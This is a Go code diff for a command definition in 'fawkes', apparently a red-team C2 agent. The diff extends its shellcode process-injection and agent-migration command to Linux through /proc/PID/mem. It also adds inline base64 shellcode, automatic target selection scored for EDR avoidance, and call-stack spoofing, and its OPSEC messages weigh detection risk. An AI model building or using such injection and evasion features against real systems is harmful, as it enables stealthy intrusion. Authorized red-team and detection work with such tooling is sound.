@@ -17,12 +17,12 @@ func init() {
 		Description:         "Perform vanilla remote process injection (inject shellcode or migrate agent into another process)",
 		HelpString:          "vanilla-injection -action inject -pid 1234 -filename shellcode.bin\nvanilla-injection -action migrate -pid 1234 -filename fawkes-shellcode.bin",
 		Version:             2,
-		MitreAttackMappings: []string{"T1055.001", "T1055.002"}, // Process Injection: Dynamic-link Library Injection, Portable Executable Injection
+		MitreAttackMappings: []string{"T1055.001", "T1055.002", "T1055.009"}, // DLL Injection, PE Injection, Proc Memory
 		SupportedUIFeatures: []string{"process_browser:inject"},
 		Author:              "@galoryber",
 		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "vanillainjection_new.js"), Author: "@galoryber"},
 		CommandAttributes: agentstructs.CommandAttribute{
-			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
+			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX},
 		},
 		CommandParameters: []agentstructs.CommandParameter{
 			{
@@ -41,6 +41,11 @@ func init() {
 					{
 						ParameterIsRequired: true,
 						GroupName:           "New File",
+						UIModalPosition:     0,
+					},
+					{
+						ParameterIsRequired: true,
+						GroupName:           "CLI",
 						UIModalPosition:     0,
 					},
 				},
@@ -76,38 +81,105 @@ func init() {
 				},
 			},
 			{
+				Name:             "shellcode_b64",
+				ModalDisplayName: "Shellcode (Base64)",
+				CLIName:          "shellcode_b64",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "Base64-encoded shellcode (for CLI/API usage)",
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: true,
+						GroupName:           "CLI",
+						UIModalPosition:     1,
+					},
+				},
+			},
+			{
 				Name:                 "pid",
 				ModalDisplayName:     "Target PID",
+				CLIName:              "pid",
 				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
-				Description:          "The process ID to inject shellcode into (for migrate: the process to migrate the agent into)",
+				Description:          "Process ID to inject into. Leave empty when using target auto-selection.",
 				DynamicQueryFunction: getProcessList,
 				DefaultValue:         "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
-						ParameterIsRequired: true,
+						ParameterIsRequired: false,
 						GroupName:           "Default",
 						UIModalPosition:     2,
 					},
 					{
-						ParameterIsRequired: true,
+						ParameterIsRequired: false,
 						GroupName:           "New File",
 						UIModalPosition:     2,
 					},
+					{
+						ParameterIsRequired: true,
+						GroupName:           "CLI",
+						UIModalPosition:     2,
+					},
+				},
+			},
+			{
+				Name:             "target",
+				ModalDisplayName: "Target Selection",
+				CLIName:          "target",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
+				Description:      "Auto-select injection target. Scores running processes for suitability (EDR avoidance, arch match, integrity level). Overrides PID when set.",
+				DefaultValue:     "",
+				Choices:          []string{"", "auto", "auto-elevated", "auto-user"},
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+						UIModalPosition:     4,
+					},
+					{
+						ParameterIsRequired: false,
+						GroupName:           "New File",
+						UIModalPosition:     4,
+					},
+					{
+						ParameterIsRequired: false,
+						GroupName:           "CLI",
+						UIModalPosition:     4,
+					},
+				},
+			},
+			{
+				Name:             "stack_spoof",
+				ModalDisplayName: "Stack Spoof",
+				CLIName:          "stack_spoof",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
+				Description:      "Spoof the call stack during injection API calls. Requires indirect_syscalls and stack_spoof build options.",
+				DefaultValue:     false,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 5},
+					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 5},
+					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 5},
 				},
 			},
 		},
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 			pid, _ := taskData.Args.GetStringArg("pid")
 			action, _ := taskData.Args.GetStringArg("action")
-			msg := fmt.Sprintf("OPSEC WARNING: Classic process injection into PID %s. "+
-				"Uses VirtualAllocEx + WriteProcessMemory + CreateRemoteThread — "+
-				"the most detectable injection pattern. Most EDR products hook these APIs. "+
-				"Consider threadless-inject or module-stomping for lower detection risk.", pid)
+			os := taskData.Callback.OS
+			var msg string
+			if strings.EqualFold(os, "linux") {
+				msg = fmt.Sprintf("OPSEC WARNING: /proc/PID/mem injection into PID %s. "+
+					"Uses ptrace attach + /proc/mem direct write — avoids PTRACE_POKETEXT "+
+					"but still requires ptrace capability. Yama LSM and seccomp may block.", pid)
+			} else {
+				msg = fmt.Sprintf("OPSEC WARNING: Classic process injection into PID %s. "+
+					"Uses VirtualAllocEx + WriteProcessMemory + CreateRemoteThread — "+
+					"the most detectable injection pattern. Most EDR products hook these APIs. "+
+					"Consider threadless-inject or module-stomping for lower detection risk.", pid)
+			}
 			if action == "migrate" {
 				msg += fmt.Sprintf("\n\nMIGRATION WARNING: This will inject a new agent instance into PID %s "+
 					"and terminate the current agent process. The current callback will go offline. "+
-					"A new callback will appear from the target process. Ensure the target process "+
-					"is stable and long-lived (e.g., explorer.exe, svchost.exe).", pid)
+					"A new callback will appear from the target process.", pid)
 			}
 			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
 				TaskID:             taskData.Task.ID,
@@ -120,7 +192,13 @@ func init() {
 		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
 			pid, _ := taskData.Args.GetStringArg("pid")
 			action, _ := taskData.Args.GetStringArg("action")
-			msg := fmt.Sprintf("OPSEC AUDIT: Classic injection (VirtualAllocEx+WriteProcessMemory+CreateRemoteThread) queued for PID %s. Artifact registered.", pid)
+			os := taskData.Callback.OS
+			var msg string
+			if strings.EqualFold(os, "linux") {
+				msg = fmt.Sprintf("OPSEC AUDIT: /proc/mem injection queued for PID %s. Artifact registered.", pid)
+			} else {
+				msg = fmt.Sprintf("OPSEC AUDIT: Classic injection (VirtualAllocEx+WriteProcessMemory+CreateRemoteThread) queued for PID %s. Artifact registered.", pid)
+			}
 			if action == "migrate" {
 				msg += " MIGRATION: Current agent will self-terminate after injection. Monitor for new callback from target process."
 			}
@@ -155,26 +233,39 @@ func init() {
 				action = "inject"
 			}
 
-			// Resolve file contents by checking actual args (not ParameterGroupName)
-			filename, fileContents, err := resolveFileContents(taskData)
-			if err != nil {
-				response.Success = false
-				response.Error = err.Error()
-				return response
+			// Check for direct base64 shellcode first (CLI/API usage)
+			var shellcodeB64 string
+			var filename string
+			sc, _ := taskData.Args.GetStringArg("shellcode_b64")
+			if sc != "" {
+				shellcodeB64 = sc
+				filename = "(inline)"
+			} else {
+				fname, fileContents, fErr := resolveFileContents(taskData)
+				if fErr != nil {
+					response.Success = false
+					response.Error = fErr.Error()
+					return response
+				}
+				filename = fname
+				shellcodeB64 = base64.StdEncoding.EncodeToString(fileContents)
 			}
 
-			// Get the target PID
+			// Decode to get size for display
+			scBytes, _ := base64.StdEncoding.DecodeString(shellcodeB64)
+
+			// Get target selection mode (if any)
+			target, _ := taskData.Args.GetStringArg("target")
+
+			// Get the target PID (may be 0 if using auto-selection)
 			pid, err := parsePIDFromArg(taskData)
 			if err != nil {
-				logging.LogError(err, "Failed to get PID")
-				response.Success = false
-				response.Error = "Failed to get target PID: " + err.Error()
-				return response
+				pid = 0
 			}
 
-			if pid <= 0 {
+			if pid <= 0 && target == "" {
 				response.Success = false
-				response.Error = "Invalid PID specified (must be greater than 0)"
+				response.Error = "Specify either a PID or a target selection mode (auto, auto-elevated, auto-user)"
 				return response
 			}
 
@@ -183,21 +274,30 @@ func init() {
 			if action == "migrate" {
 				actionLabel = "Migrate"
 			}
-			displayParams := fmt.Sprintf("Action: %s\nShellcode: %s (%d bytes)\nTarget PID: %d", actionLabel, filename, len(fileContents), pid)
+			var displayParams string
+			if target != "" {
+				displayParams = fmt.Sprintf("Action: %s\nShellcode: %s (%d bytes)\nTarget: %s (auto-select)", actionLabel, filename, len(scBytes), target)
+			} else {
+				displayParams = fmt.Sprintf("Action: %s\nShellcode: %s (%d bytes)\nTarget PID: %d", actionLabel, filename, len(scBytes), pid)
+			}
 			response.DisplayParams = &displayParams
 
-			artifactDesc := fmt.Sprintf("VirtualAllocEx/WriteProcessMemory/CreateRemoteThread into PID %d (%d bytes)", pid, len(fileContents))
+			artifactDesc := fmt.Sprintf("VirtualAllocEx/WriteProcessMemory/CreateRemoteThread into PID %d (%d bytes)", pid, len(scBytes))
+			if target != "" {
+				artifactDesc = fmt.Sprintf("VirtualAllocEx/WriteProcessMemory/CreateRemoteThread with auto-target '%s' (%d bytes)", target, len(scBytes))
+			}
 			if action == "migrate" {
 				artifactDesc += " [MIGRATE: agent will self-terminate after injection]"
 			}
 			createArtifact(taskData.Task.ID, "Process Inject", artifactDesc)
 
-			// Build the actual parameters JSON that will be sent to the agent
-			// Encode shellcode contents as base64 to embed in JSON
+			stackSpoof, _ := taskData.Args.GetBooleanArg("stack_spoof")
 			params := map[string]interface{}{
-				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
+				"shellcode_b64": shellcodeB64,
 				"pid":           pid,
+				"target":        target,
 				"action":        action,
+				"stack_spoof":   stackSpoof,
 			}
 
 			paramsJSON, err := json.Marshal(params)
